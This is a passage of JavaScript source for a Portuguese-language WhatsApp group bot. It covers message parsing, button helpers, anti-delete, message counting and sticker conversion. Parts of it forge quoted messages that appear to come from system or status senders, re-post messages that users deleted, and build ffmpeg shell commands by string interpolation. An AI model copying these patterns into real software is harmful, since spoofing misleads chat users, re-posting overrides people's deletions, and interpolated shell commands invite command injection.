		global.batteryLevelStr = json[2][0][1].value
		global.batterylevel = parseInt(batteryLevelStr)
		baterai = batterylevel
		if (json[2][0][1].live == 'true') charging = true
		if (json[2][0][1].live == 'false') charging = false
	    })
		global.p
		global.batrei = global.batrei ? global.batrei : []
		loli.on('CB:action,,battery', json => {
		const batteryLevelStr = json[2][0][1].value
		const batterylevel = parseInt(batteryLevelStr)
		global.batrei.push(batterylevel)
    })
    
    /*loli.on('message-update', async (mek) => {
m = simple.smsg(tobi, mek)
if ((Object.keys(mek.message)[0] === 'ephemeralMessage' && JSON.stringify(mek.message).includes('EPHEMERAL_SETTING')) && mek.message.ephemeralMessage.message.protocolMessage.type === 3) {
 bugsol = mek.participants[0]
 tekuss = `\`\`\`Bugs detectados\`\`\`

\`\`\`@⁨${bugsol.split('@')[0]} Enviando bugs no grupo ${groupName}\`\`\``
loli.sendMessage(mek.key.remoteJid, 'WOW BUGS', MessageType.text)
loli.sendMessage(mek.key.remoteJid, tekuss, MessageType.text, { contexInfo: { mentionedJid:[bugsol] }})
}
})*/

loli.on('message-delete', async(m) => {
from = m.key.remoteJid
time = moment().format('HH:mm:ss')
type = Object.keys(m.message)[0]
m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
if (from == "status@broadcast") return
if (!m.key.fromMe && m.key.fromMe) return
te = `[ ANTI DELETE ]\n\nDe: @${m.participant.split("@")[0]}\nHora: ${time}`
loli.copyNForward(from, m.message)
loli.sendMessage(from, te, MessageType.text, {quoted: m.message, contextInfo: {"mentionedJid": [m.participant]}})
})

/*===================================================================================================*/  
			
/*===================================================================================================*/  

/*====================================[CHAT UPDATE]===========================================================*/  
loli.on('chat-update', async (mek) => {
try {
if (!mek.hasNewMessage) return
mek = mek.messages.all()[0]
if (!mek.message) return
if (mek.key && mek.key.remoteJid == 'status@broadcast') return
// if (mek.key.fromMe) return
if (!mek.key.fromMe && banChats === true) return
m = simple.smsg(loli, mek)
global.prefix
global.blocked
const content = JSON.stringify(mek.message)
const from = mek.key.remoteJid
const type = Object.keys(mek.message)[0]
const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
const prefix = /^[°•π÷×¶∆£¢€¥®™=|~#%^&.?/\\©^z+*,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™=|~#%^&.?/\\©^z+*,;]/gi) : '!'
const { text, extendedText, contact, contacsArray, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
/*===================================================================================================*/  
const dbids = []
			for(i=0;i<dontback.length;++i) {
				dbids.push(dontback[i].groupId)
			}
/*===================================================================================================*/  
//>>>>>>>>>>>>>>>>>>>>>>>>[ TEMPO REAL STATUS ]<<<<<<<<<<<<<<<<<<<<<<<<<<\\

     waktu = process.uptime() 
     loli.setStatus(`💎𝙃𝙊𝙍𝙄 𝙏𝙀𝙈𝙋𝙊 𝘼𝙏𝙄𝙑𝘼 | ${temporizador(os.uptime())}⠀⠀⠀⠀⠀⠀⠀⠀⠀💎𝘽𝙊𝙏 𝘿𝙊 𝙃𝙀𝙉𝙋𝙇𝘼𝙔 ( 𝘾𝙍𝙄𝘼𝘿𝙊𝙍 𝙋𝙊𝙍 𝙕𝘼𝘿𝙄𝙆 )`).catch((_)=>_);
     settingstatus = new Date() * 1;
/*====================================[DATE TIME HORA]===========================================================*/  
           
const hr = moment.tz('America/Sao_Paulo').format('HH:mm:ss')
const time = moment.tz('America/Sao_Paulo').format('DD/MM HH:mm:ss')
const timi = moment.tz('America/Sao_Paulo').add(30, 'days').calendar();
const timu = moment.tz('America/Sao_Paulo').add(20, 'days').calendar();
const time2 = moment().tz('America/Sao_Paulo').format('HH:mm:ss')

//_BODY DO PROPRIO BOT
body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : ''
budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
//_BODY DO PROPRIO BOT ^^^^^^^^

//_"selectedButton" É QUANDO SELECIONA ALGUM BOTÃO
selectedButton = (type == 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedButtonId : ''
responseButton = (type == 'listResponseMessage') ? mek.message.listResponseMessage.title : ''
buttons = (type === 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedDisplayText : ''
body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'videoMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'extendedTextMessage') && mek.message[type].text.startsWith(prefix) ? mek.message[type].text : (type == 'listResponseMessage') && mek.message[type].singleSelectReply.selectedRowId ? mek.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId : (type == 'stickerMessage') && ((mek.message[type].fileSha256.toString('base64')) !== null && (mek.message[type].fileSha256.toString('base64')) !== undefined) ? (mek.message[type].fileSha256.toString('base64')) : ""
//_^^^^^^ BODY DOS BOTÕES Q SO PEGA EM WHATSAPP NORMAL OU BUSSINES ^^^^^^
/********** BOTÃO VIDEO **********/
const sendButVideo = async(from, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await loli.prepareMessage(from, kma, video)
const buttonMessages = {
videoMessage: mhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
loli.sendMessage(from, buttonMessages, MessageType.buttonsMessage, options)
}

/********** BOTÃO IMAGE **********/
const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await loli.prepareMessage(from, kma, image, {thumbnail: null})
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 4
}
loli.sendMessage(from, buttonMessages, MessageType.buttonsMessage, options)
}

 const sendButton = async(from, context, fortext, but, mek) => {
        const buttonMessages = {
        contentText: context,
        footerText: fortext,
        buttons: but,
        headerType: 1
        }
        loli.sendMessage(from, buttonMessages, MessageType.buttonsMessage, {
        quoted: mek
        })
        }

async function sendButLocation(id, text1, desc1, gam1, but = [], options = {}) {
        const buttonMessages = { locationMessage: { jpegThumbnail: gam1 }, contentText: text1, footerText: desc1, buttons: but, headerType: 6 }
        return loli.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
        } 
        var sendButloc = (from, title, text, desc, button, sen, men, file) => {
        return loli.sendMessage(from, {"text": '',"contentText": title + text,"footerText": desc, "buttons": button, "headerType": "LOCATION", "locationMessage": { "degreesLongitude": "", "degreesLatitude": "", "jpegThumbnail": file}}, MessageType.buttonsMessage, { quoted: mek, contextInfo: {"mentionedJid": men ? men : []}})
        }    
                                                     
//_Botão de lista 
// responseButton = (type == 'listResponseMessage') ? mek.message.listResponseMessage.title : ''
const listRM = (type === 'listResponseMessage') ? mek.message.listResponseMessage.singleSelectReply.selectedRowId : ''

var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
const cmdstk = Object.keys(mek.message)[0] == "stickerMessage" ? mek.message.stickerMessage.fileSha256.toString('base64') : ""
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : ''
			budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
bidy =  budy.toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const argss = body.split(/ +/g) //jogo da velha
const hour_now = moment().format('HH:mm:ss')
uptime = process.uptime();
const ping = (`Pong! ${temporizador(uptime)}`)
const batanu = global.batrei[global.batrei.length - 1] //_Bateria

/*===================================================================================================*/  

/*=======================================================================================================*/  

const isCmd = body.startsWith(prefix)
const anun = budy.slice(0).trim().split(/ +/).shift().toLowerCase()
const testea = budy
const testat = budy
const totalchat = await loli.chats.all()
const botNumber = loli.user.jid
const number = [`5521971702453@s.whatsapp.net`, `552196917930@s.whatsapp.net`]
const ownerNumberB = []
const isGroup = from.endsWith('@g.us')
const isDontBack = (isGroup && dbids.indexOf(from) >= 0) ? true : false
//const sender = isGroup ? mek.participant : mek.key.remoteJid
sender = mek.key.fromMe ? loli.user.jid : mek.key.remoteJid.endsWith('@g.us') ? mek.participant : mek.key.remoteJid
const jid = sender
const groupMetadata = isGroup ? await loli.groupMetadata(from) : 'query'.toString
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.jid : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const arrayQND = ['Hoje', 'Amanhã', 'Nunca', 'dia', 'semana', 'mês', 'ano']
const arrayQND2 = ['dias', 'semanas', 'meses', 'anos']
const isOwner = number.includes(sender)
const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
const isGroupAdmins = groupAdmins.includes(sender) || false
const groupDesc = isGroup ? groupMetadata.desc : ''

/*===================================================================================================*/  
const sendFileFromUrl = async(link, type, options) => {
hasil = await getBuffer(link)
loli.sendMessage(from, hasil, type, options).catch(e => {
fetch(link).then((hasil) => {
loli.sendMessage(from, hasil, type, options).catch(e => {
loli.sendMessage(from, { url : link }, type, options).catch(e => {
reply('_[ ! ] Erro ao baixar e enviar mídia_')
})
})
})
})
}
/*====================================[Arquivos antis]===========================================================*/  

const isBanned = ban.includes(sender) //Banido do bot
const isUser = checkRegisteredUser(sender) //Use
const isvipp = vipp.includes(sender) //Vip
const isPetualang = checkPetualangUser(sender)
const isOwnerB = ownerNumberB.includes(sender) //Owner "Dono do bot"
const isRegistered = checkRegisteredUser(sender) //Registro

//Modo de RPG de banco de dados por Zadik
const _RPG = JSON.parse(fs.readFileSync('./lib/rpg/inventori.json'))
const _petualang = JSON.parse(fs.readFileSync('./lib/rpg/inventori.json'))
const _healt = JSON.parse(fs.readFileSync('./lib/rpg/healt.json'))
const limit = JSON.parse(fs.readFileSync('./limit.json'));


//TESTE ATIVAR && DESLIGAR
const isAntiLink = isGroup ? antilink.includes(from) : false //Anti link
const isLevelingOn = isGroup ? _leveling.includes(from) : true //Leveling "Leveis de grupos"
const isAntitexto = isGroup ? antitexto.includes(from) : true //Leveling "Leveis de grupos"
const isAutofigu = isGroup ? autofigu.includes(from) : true //Auto figurinhas
const isWelcome = isGroup ? welcome.includes(from) : true //Welcome
const isAutoReply = isGroup ? autoreply.includes(from) : true
const isAntiCatalogo = isGroup ? anticatalogo.includes(from) : true
const isNsfw = isGroup ? nsfw.includes(from) : false
const OriginalOwner = '5521971702453'
const isAntiPv = (antipv.indexOf('Ativado') >= 0) ? true : false
const isAntiLoc = isGroup ? antiloc.includes(from) : true
const isAntiDoc = isGroup ? antidoc.includes(from) : true
const isAntinsfw = isGroup ? antinsfw.includes(from) : true
const isAntictt = isGroup ? antictt.includes(from) : true //Anti contatos
const isAntiflod = isGroup ? antiflod.includes(from) : true //Anti flods

const isAntiteste = isGroup ? antiteste.includes(from) : false //Antifake

/*===================================================================================================*/  

/*===================================================================================================*/  

//EMOJIS ALEATÓRIO DE VARIOS COMANDOS
const emojis = ['🙃', '❤️', '🙂', '💞', '💢', '🛐', '😳', '🤬', '😏', '😠', '🔥', '🤯', '💥', '💦', '💘', '👀', '👍🏼', '👉🏼👈🏼', '💅🏼', '🌺', '🌸', '👾', '🏓', '🍑', '🌀', '☀️', '🌟', '🌈', '🌌', '🌉', '🌆', '🌃', '🙈', '🙉', '🙊']
randomemojis = emojis[Math.floor(Math.random() * emojis.length)]

//LINGUADA, CMD CHUPADA
var linguad = ["Linguada", "Chupada"]
var linguidaa = linguad[Math.floor(Math.random() * linguad.length)]

//TIROS DO CMD TIRO
const tiroteio = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10']
randomtiro = tiroteio[Math.floor(Math.random() * tiroteio.length)]

//COMD CUTUCAR 
var cutuca = ["Uma vez", "Duas vezes", "Tres vezes"]
var cutucada = cutuca[Math.floor(Math.random() * cutuca.length)]

/*===================================================================================================*/  

/*====================================[ANTI LINK ACESSO]===========================================================*/  

const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
const antibot = m.isBaileys
const q = args.join(' ')
const id = botNumber
const tescuk = ["0@s.whatsapp.net"]
let pushname = loli.contacts[sender] != undefined ? loli.contacts[sender].vname || loli.contacts[sender].notify: undefined

/*===================================================================================================*/  

/*====================================[DATE HORA SAY TIME TEMPO]===========================================================*/  

var date = new Date();
var tahun = date.getFullYear();
var bulan1 = date.getMonth();
var tanggal = date.getDate();
var hari = date.getDay();
var jam = date.getHours();
var menit = date.getMinutes();
var detik = date.getSeconds();
var waktoo = date.getHours();
switch(hari) {
case 0: hari = 'Domigo'; break;
case 1: hari = 'Segunda-feira'; break;
case 2: hari = 'terça'; break;
case 3: hari = 'quarta-feira'; break;
case 4: hari = 'quinta-feira'; break;
case 5: hari = 'sexta-feira'; break;
case 6: hari = 'sábado'; break;
}
switch(bulan1) {
case 0: bulan1 = 'Janeiro'; break;
case 1: bulan1 = 'fevereiro'; break;
case 2: bulan1 = 'Março'; break;
case 3: bulan1 = 'abril'; break;
case 4: bulan1 = 'Maio'; break;
case 5: bulan1 = 'Junho'; break;
case 6: bulan1 = 'julho'; break;
case 7: bulan1 = 'agosto'; break;
case 8: bulan1 = 'setembro'; break;
case 9: bulan1 = 'Outubro'; break;
case 10: bulan1 = 'novembro'; break;
case 11: bulan1 = 'dezembro'; break;
}
 var tampilHari = '' + hari + ', ' + tanggal + ' ' + bulan1 + ' ' + tahun;
var tampilJam = '' + jam + ':' + menit + ':' + detik + ' Horário';
var ase = new Date();
    var waktoo = ase.getHours();
    switch(waktoo){
case 0: waktoo = 'Hora da meia-noite🌚'; break;
case 1: waktoo = 'Hora da meia-noite🌚'; break;
case 2: waktoo = 'De manhã cedo🌒'; break;
case 3: waktoo = 'De manhã cedo🌓'; break;
case 4: waktoo = 'Alvorecer🌔'; break;
case 5: waktoo = 'Alvorecer🌔'; break;
case 6: waktoo = 'bom dia 🌝'; break;
case 7: waktoo = 'bom dia 🌝'; break;
case 8: waktoo = 'bom dia 🌝'; break;
case 9: waktoo = 'bom dia 🌝'; break;
case 10: waktoo = 'bom dia 🌝'; break;
case 11: waktoo = 'Boa tarde 🌞'; break;
case 12: waktoo = 'Boa tarde 🌞'; break;
case 13: waktoo = 'Boa tarde 🌞'; break;
case 14: waktoo = 'Boa tarde 🌞'; break;
case 15: waktoo = 'Boa tarde 🌝'; break;
case 16: waktoo = 'Boa tarde 🌝'; break;
case 17: waktoo = 'Boa tarde 🌖'; break;
case 18: waktoo = 'Quase a noite 🌘'; break;
case 19: waktoo = 'Quase a noite 🌚'; break;
case 20: waktoo = 'Boa noite 🌚'; break;
case 21: waktoo = 'Boa noite 🌚'; break;
case 22: waktoo = 'Boa noite 🌚'; break;
case 23: waktoo = 'Boa noite 🌚'; break;
}
var tampilUcapan = '' + waktoo;  

/*===================================================================================================*/  

/*====================================[NÃO MEXA EM NADA]===========================================================*/  

var ase = new Date();
var waktoonyabro = ase.getHours();
switch(waktoonyabro){
case 0: waktoonyabro = `Boa noite ${pushname}🌛`; break;
case 1: waktoonyabro = `Boa noite ${pushname}🌛`; break;
case 2: waktoonyabro = `Boa noite ${pushname}🌛`; break;
case 3: waktoonyabro = `Bom Dia ${pushname}⭐`; break;
case 4: waktoonyabro = `Bom Dia ${pushname}⭐`; break;
case 5: waktoonyabro = `Bom Dia ${pushname}⭐`; break;
case 6: waktoonyabro = `Bom Dia ${pushname}⭐`; break;
case 7: waktoonyabro = `Bom Dia ${pushname}⭐`; break;
case 8: waktoonyabro = `Bom Dia ${pushname}⭐`; break;
case 9: waktoonyabro = `Bom Dia ${pushname}⭐`; break;
case 10: waktoonyabro = `Bom Dia ${pushname}⭐`; break;
case 11: waktoonyabro = `Boa tarde ${pushname}🔥`; break;
case 12: waktoonyabro = `Boa tarde ${pushname}🔥`; break;
case 13: waktoonyabro = `Boa tarde ${pushname}🔥`; break;
case 14: waktoonyabro = `Boa tarde ${pushname}🔥`; break;
case 15: waktoonyabro = `Boa tarde ${pushname}🌹`; break;
case 16: waktoonyabro = `Boa tarde ${pushname}🌹`; break;
case 17: waktoonyabro = `Boa tarde ${pushname}🌹`; break;
case 18: waktoonyabro = `Boa tarde ${pushname}🌛`; break;
case 19: waktoonyabro = `Boa noite ${pushname}🌛`; break;
case 20: waktoonyabro = `Boa noite ${pushname}🌛`; break;
case 21: waktoonyabro = `Boa noite ${pushname}🌛`; break;
case 22: waktoonyabro = `Boa noite ${pushname}🌛`; break;
case 23: waktoonyabro = `Boa noite ${pushname}🌛`; break;
}
var ucapanFakereply = '' + waktoonyabro;

/*===================================================================================================*/  

/*====================================[NÃO MEXA EM NADA]===========================================================*/  
/********** VERIFICADOS **********/
/** Verificado com o nome bom dia **/
const horiBom = { key: {fromMe: false,participant: "0@s.whatsapp.net", remoteJid: "0@s.whatsapp.net"},message: {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "mememteeeekkeke","groupName": "Lolizita", "caption": `${waktoo}`}}}

/** Verificado com o nome ohayo **/
const horiOhayo = { key: {fromMe: false,participant: "0@s.whatsapp.net", remoteJid: "0@s.whatsapp.net"},message: {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "mememteeeekkeke","groupName": "Lolizita", "caption": `${waktoonyabro}`}}}

/** Verificado com o nome e foto **/
const horiNome = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;AKAME,;;;\nFN:AKAME,\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync(`./lib/logo.jpeg`), thumbnail:fs.readFileSync(`./lib/logo.jpeg`),sendEphemeral: true}}}

/** Verificado de catálogo com nome **/
const horicat = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})}, message: { "productMessage": { "product": { "productImage":{ "mimetype": "image/jpeg", "jpegThumbnail": dfrply}, "title": `${waktoonyabro}`, "description": `${waktoonyabro}`, "currencyCode": "USD", "priceAmount1000": "2000", "retailerId": `${waktoonyabro}`, "productImageCount": 1},"businessOwnerJid": `0@s.whatsapp.net`}}}

/** Verificado de carrinho com nome **/
const horicarr = {key : {participant : '0@s.whatsapp.net'}, message: {orderMessage: {itemCount : 123, status: 1, surface : 1, message: `${waktoonyabro}`, orderTitle: `${waktoonyabro}`, thumbnail: dfrply, sellerJid: '0@s.whatsapp.net' }}}
const horistk1 = {
"key": {
	  "participant": `0@s.whatsapp.net`,
      "remoteJid": "6289643739077-1613049930@g.us",
      "fromMe": false,
      "id": "3B64558B07848BD81108C1D14712018E"
    },
    "message": {
      "stickerMessage": {
        "fileSha256": "uZiOJzqOvrOo2WGjnMKgX2MMQMyasT+ZDgqUczpIBmY=",
		"pngThumbnail": dfrply,
	 "mimetype": "image/webp",
        "height": 64,
        "width": 64,
        "directPath": "/v/t62.15575-24/56110107_763365384384977_5720135628188301198_n.enc?oh=450f8f684b06f0ba2dbc9779e5f06774&oe=605B81EE",
        "fileLength": "60206",
        "firstFrameLength": 3626,
        "isAnimated": false
      }
    },
    "messageTimestamp": "1614070775",
    "status": "PENDING"
  }
/** Verificado de localização com nome **/
const horiloc = {key : {participant : '0@s.whatsapp.net'},message: {liveLocationMessage: {caption: `${waktoonyabro}`,jpegThumbnail: dfrply}}}

/** Verificado de video com nome **/
const horivid = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? {remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": {"title": `${waktoonyabro}`, "h": `${waktoonyabro}`, 'duration': '99999', 'caption': `${waktoonyabro}`, 'jpegThumbnail': dfrply}}}

/** Verificado de documento com nome **/
const horidoc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `${waktoonyabro}`, jpegThumbnail: dfrply}}}

/** Verificado de convite com nome **/
const horicon = {"key": {"fromMe": false,"participant": "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": `${waktoonyabro}`,"groupName": `${waktoonyabro}`, "caption": `${waktoonyabro}`, 'jpegThumbnail': dfrply}}}

/** Verificado de sticker com nome **/
const horistk = {"key": {"participant": `0@s.whatsapp.net`,"remoteJid": "6289643739077-1613049930@g.us","fromMe": false,"id": "3B64558B07848BD81108C1D14712018E"},"message": {"stickerMessage": {"fileSha256": "uZiOJzqOvrOo2WGjnMKgX2MMQMyasT+ZDgqUczpIBmY=","jpegThumbnail": fs.readFileSync('lib/logo.jpeg'),"mimetype": "image/webp","height": 64,"width": 64,"directPath": "/v/t62.15575-24/56110107_763365384384977_5720135628188301198_n.enc?oh=450f8f684b06f0ba2dbc9779e5f06774&oe=605B81EE","fileLength": "60206","firstFrameLength": 3626,"isAnimated": false}},"messageTimestamp": "1614070775","status": "PENDING"}

/** Verificado de gif com nome **/
const horigif = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? {remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title": `${waktoonyabro}`,"h": `${waktoonyabro}`,'duration': '99999', 'gifPlayback': 'true', 'caption': `${waktoonyabro}`,'jpegThumbnail': dfrply}}}

/** Verificado com nome **/
const horitex = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "extendedTextMessage": {"text": `${waktoonyabro}`,"title": `${waktoonyabro}`,'jpegThumbnail': dfrply}}}

/** Verificado de audio com nome **/
const horiaud = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds": "9999999","ptt": "true"}}}

const sayo = `📄${NomeDoBot}\n🔋Bateria ${batanu}` 
const say= {
key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "caption": sayo} } } 
const say1 = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${ucapanFakereply}\n⊳ Comando : ${prefix}${command}`, 'jpegThumbnail': fs.readFileSync('lib/logo.jpeg')} } }
const say2 = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${waktoo}`, 'jpegThumbnail': fs.readFileSync('lib/logo.jpeg')} } }
const say3 = { key: { groupName, tampilJam, fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${groupName}\n${ucapanFakereply}\nHorário: ${tampilJam}`, 'jpegThumbnail': fs.readFileSync('lib/logo.jpeg')} } }
const tob = { key: { groupName, tampilJam, fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `\n${groupName}\n${ucapanFakereply}\nHorário: ${tampilJam}`, 'jpegThumbnail': fs.readFileSync('lib/logo.jpeg')} } }
const say4 = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "5521982613254@s.whatsapp.net" } : {})},message: {orderMessage: {itemCount : 999999,status: 1,surface : 1,message: `Copyright © zadik/Hori-BOT`,orderTitle: '💎♡Høřı.B.O.T♡💎',thumbnail: fs.readFileSync('./lib/logo.jpeg'), sellerJid: '0@s.whatsapp.net'}}}
const fvid = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
                 "videoMessage": { 
                 "title": `💎♡Høřı.B.O.T♡💎`,
                 "h": `${tampilJam} ${pushname}`,
                 'duration': '99999', 
                 'caption': `${tampilJam} ${pushname}`,
                 'jpegThumbnail': dfrply
                        }
                       }
	                  }
const ftex = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
		"extendedTextMessage": {
                 "text": `*${ucapanFakereply} - \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}*`,
                 "title": `${sayo}`,
                "jpegThumbnail": fs.readFileSync('src/logo.jpeg')
                        }
	                  } 
                     }

/*===================================================================================================*/  
const groupIdscount = []
			const numbersIds = []
			for(let obj of countMessage) {
				groupIdscount.push(obj.groupId)
			}
			if(isGroup && groupIdscount.indexOf(from) >= 0) {
				var ind = groupIdscount.indexOf(from)
				for(let obj of countMessage[ind].numbers) {numbersIds.push(obj.jid)}
				if(numbersIds.indexOf(sender) >=0) {
					var indnum = numbersIds.indexOf(sender)
					countMessage[ind].numbers[indnum].messages += 1
					countMessage[ind].numbers[indnum].cmd_messages += isCmd ? 1 : 0
					fs.writeFileSync('./src/countmsg.json', JSON.stringify(countMessage, null, 2)+ '\n')
				} else {
					const messages = 1
					const cmd_messages = isCmd ? 1 : 0
					countMessage[ind].numbers.push({
						jid: sender,
						messages: messages,
						cmd_messages: cmd_messages
					})
					fs.writeFileSync('./src/countmsg.json', JSON.stringify(countMessage, null, 2) + '\n')
				}
			}
			else if(isGroup) {
				countMessage.push({
					groupId: from,
					numbers: [{
						jid: sender,
						messages: 2,
						cmd_messages: isCmd ? 1 : 0
					}]
				})
				fs.writeFileSync('./src/countmsg.json', JSON.stringify(countMessage, null, 2) + '\n')
			}

/*===================================================================================================*/  




const sendStickerFromUrl = async(to, url) => {
var names = Date.now() / 10000;
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
download(url, './sticker' + names + '.png', async function () {
console.log("pronto")
let filess = './sticker' + names + '.png'
let asw = './sticker' + names + '.webp'
exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
exec(`webpmux -set exif ${addMetadata('Hori-BOT', 'Henplay')} ${asw} -o ${asw}`, async (error) => {
if(err) return reply('Deu erro, tente novamente :/')
let media = fs.readFileSync(asw)
loli.sendMessage(to, media, MessageType.sticker,{sendEphemeral: true, contextInfo: { forwardingScore: 50, isForwarded: true}, quoted: say1})
fs.unlinkSync(filess)
fs.unlinkSync(asw)
});
});
});
};

const sendStickerGIFFromUrl = async(to, url) => {
var names = Date.now() / 10000;
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
download(url, './sticker' + names + '.png', async function () {
console.log("pronto")
let filess = './sticker' + names + '.png'
let asw = './sticker' + names + '.webp'
exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${asw}`, (err) => {
exec(`webpmux -set exif ${addMetadata('Hori-BOT', 'Henplay')} ${asw} -o ${asw}`, async (error) => {
if(err) return reply('Deu erro, tente novamente :/')
let media = fs.readFileSync(asw)
loli.sendMessage(to, media, MessageType.sticker,{sendEphemeral: true, contextInfo: { forwardingScore: 50, isForwarded: true}, quoted: say1})
fs.unlinkSync(filess)
fs.unlinkSync(asw)
});
});
});
};



/*====================================[NÃO MEXA EM NADA]===========================================================*/  

const reply = (tej) => {
